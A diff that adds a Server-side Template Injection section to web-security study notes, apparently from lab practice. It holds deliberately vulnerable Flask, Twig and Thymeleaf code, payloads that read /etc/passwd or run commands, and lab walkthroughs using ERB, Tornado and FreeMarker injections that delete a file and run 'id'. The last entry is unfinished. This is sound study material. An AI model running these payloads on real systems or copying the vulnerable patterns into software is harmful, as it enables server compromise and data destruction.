@@ -3074,10 +3074,128 @@ LLM -> API: create_email_forwarding_rule('peter')
      ```
 
 ## Server-side Template Injection
-Content for Server-side Template Injection...
+- Server-Side Template Injection (SSTI) occurs when an attacker can inject malicious code into templates used by a web application on the server-side. This vulnerability arises when user input is incorrectly handled within the template engine
+  - Python: Jinja2
+    ```
+    source: name = request.args.get('name', 'Guest'); sink: f"Hello {name}!
+    
+    from flask import Flask, render_template_string, request
+
+	app = Flask(__name__)
+	
+	@app.route('/greet', methods=['GET'])
+	def greet():
+	    name = request.args.get('name', 'Guest')
+	    template = f"Hello {name}!"
+	    return render_template_string(template)
+    ```
+  - PHP: Twig
+    ```
+    source: $_GET['name']; sink: render()
+    
+    <?php
+	require_once '/path/to/vendor/autoload.php';
+	
+	$loader = new \Twig\Loader\ArrayLoader([
+	    'index' => 'Hello {{ name }}!',
+	]);
+	
+	$twig = new \Twig\Environment($loader);
+	
+	if (isset($_GET['name'])) {
+	    $name = $_GET['name'];  // User input is used directly in the template
+	    echo $twig->render('index', ['name' => $name]);
+	} else {
+	    echo $twig->render('index', ['name' => 'Guest']);
+	}
+	?>
+    ```
+  - Java: Thymeleaf
+    ```
+    source: @RequestParam(name="name"); sink: th:text="${name}"
+    
+    import org.springframework.stereotype.Controller;
+	import org.springframework.ui.Model;
+	import org.springframework.web.bind.annotation.GetMapping;
+	import org.springframework.web.bind.annotation.RequestParam;
+	
+	@Controller
+	public class GreetingController {
+	
+	    @GetMapping("/greet")
+	    public String greet(@RequestParam(name="name", required=false, defaultValue="Guest") String name, Model model) {
+	        // User input is passed directly to the model without validation
+	        model.addAttribute("name", name);
+	        return "greeting";
+	    }
+	}
+
+    greeting.html
+    <!DOCTYPE html>
+	<html xmlns:th="http://www.thymeleaf.org">
+	<head>
+	    <title>Greeting</title>
+	</head>
+	<body>
+	    <p>Hello, <span th:text="${name}">Guest</span>!</p>
+	</body>
+	</html>
+    ```
+- Example payload
+  ```
+  {{ config.items() }} #leak configuration data  
+  {{ self._template.__globals__.__builtins__.eval('open("/etc/passwd").read()') }} #read the /etc/passwd  
+  http://example.com/greet?name=${T(java.lang.Runtime).getRuntime().exec('ls')} 
+  ```
+**How to detect SSTI**
+- Fuzzing with payloads `{{7*7}}`, `${7*7}`, `<%= 7 * 7 %>`
+- Error message: "TemplateSyntaxError", "UndefinedError"
+
+**Methodology of SSTI steps**
+- look for reflection of user-controlled input
+- check if payload is evaluated, enumerate the templating engine OR trigger an error that can disclosre the name of the templating engine
+  ```
+  {{7*7}}
+  ${7*7}
+  <%=7*7%>
+  ${{7*7}}
+  #{7*7}
+  ```
+- [exploitation](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) 
+
+**Mitigation**
+- Escape User Input
+- Use Sandboxing
+- Avoid Direct User Input in Templates  
 
 ### Server-side Template Injection Lab
-
+- **Basic** server-side template injection
+  - GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock
+  - Test payload > URL encode `<%= 7*7 %>` > Response 49
+  - Exploit > `<%= system("rm /home/carlos/morale.txt") %>` > Carlos file deleted
+- Basic server-side template injection **(code context)**
+  - POST /my-account/change-blog-post-author-display
+    blog-post-author-display=**user.first_name**&csrf=C3aJyFuUFHQSFBRi1RjW6F0hVFeWYDJb
+  - Test invalid field > user.first_nameZZ >
+    "Traceback (most recent call last): File "<string>", line 16, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 348, in generate return execute() File "<string>.generated.py", line 4, in _tt_execute AttributeError: User instance has no attribute 'first_nameZZ'"  
+  - Study the **Tornado** documentation to discover that template expressions are surrounded with double curly braces, such as {{someExpression}}  escape out of the expression }}
+    blog-post-author-display=user.name`}}{{7*7&` > response username49
+  - Remove carlos file by using python OS module
+    blog-post-author-display=user.name`}}{% import os %}{{os.system('rm /home/carlos/morale.txt')`  #URL encode the payload  
+- Server-side template injection using **documentation**
+  - Edit product template
+    Only ${product.stock} left of ${product.name} at ${product.price}. > click preview > "Only 456 left of Mood Enhancer at $78.82."
+  - Test invalid syntax error
+     `${product.ZZstock}` > "Only **FreeMarker** template error (DEBUG mode; use RETHROW in production!)" > discover FreeMarker template
+  - Test payload
+    `<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}` > "uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)"
+  - Exploit and remove carlos file
+    `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt")}`
+- Server-side template injection in an unknown language with a **documented exploit**
+  - 
+- dd
+- dd
+  
 ## Web Cache Poisoning
 Content for Web Cache Poisoning...
 
